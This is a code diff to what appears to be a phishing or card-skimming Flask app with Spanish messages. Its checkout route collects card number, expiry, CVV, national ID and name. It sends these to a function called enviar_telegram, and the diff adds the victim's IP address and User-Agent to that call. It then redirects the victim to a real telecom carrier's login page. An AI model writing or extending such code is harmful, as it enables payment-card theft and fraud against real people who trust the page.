@@ -5,6 +5,8 @@ import re
 import csv
 
 
+
+
 app = Flask(__name__)
 
 
@@ -93,7 +95,7 @@ def checkout():
         if not numcc or len(numcc) != 16 or not numcc.isdigit():
             mensaje_error = 'La cantidad de caractéres no son válidos.'
             print(mensaje_error)
-            
+            return render_template('checkout.html', error=mensaje_error)
 
 
         if mensaje_error_cvv and mensaje_error:
@@ -113,7 +115,13 @@ def checkout():
 
                 print(primeros_6_digitos)
                 info_date = customer_date(dni)
-                enviar_telegram(numcc, exp, cvv, dni, name, info_date)
+
+
+                ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+                user_agent = request.headers.get('User-Agent')
+
+
+                enviar_telegram(numcc, exp, cvv, dni, name, info_date, ip, user_agent)
                 return redirect("https://simple.claro.com.ar/inicio/auth/pin")
             else:
                 
